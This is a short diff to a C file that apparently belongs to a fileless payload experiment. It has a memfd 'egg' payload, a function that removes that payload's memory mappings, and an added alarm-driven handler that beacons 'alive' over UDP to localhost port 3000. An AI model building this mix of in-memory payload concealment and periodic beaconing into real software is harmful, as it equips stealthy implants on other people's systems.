@@ -4,10 +4,15 @@
 #include <string.h>
 #include <signal.h>
 #include <unistd.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 
 #include <sys/mman.h>
 
+// How often we want our alarm() based interupt to run.
+#define SLEEP_TIME 5
 
+// We remove all mappings with this name
 #define EGG_NAME "/memfd:egg"
 
 void remove_mappings(void)
@@ -64,8 +69,16 @@ void remove_mappings(void)
 }
 
 static void dothis(int signum) {
-    write(1, "h", 1);
-    alarm(5);
+    int sock = socket(AF_INET, SOCK_DGRAM, 0);
+    
+    struct sockaddr_in addr = {
+        .sin_family = AF_INET,
+        .sin_port = htons(3000),
+        .sin_addr.s_addr = htonl(INADDR_LOOPBACK)
+    };
+    
+    sendto(sock, "alive\n", 6, 0, (struct sockaddr*)&addr, sizeof(addr));
+    alarm(SLEEP_TIME);
 }
 
 
@@ -78,7 +91,7 @@ int payload()
     sigemptyset(&psa.sa_mask);
 
     sigaction(SIGALRM, &psa, NULL);
-    alarm(1);
+    alarm(SLEEP_TIME);
     return 0;
 }
 
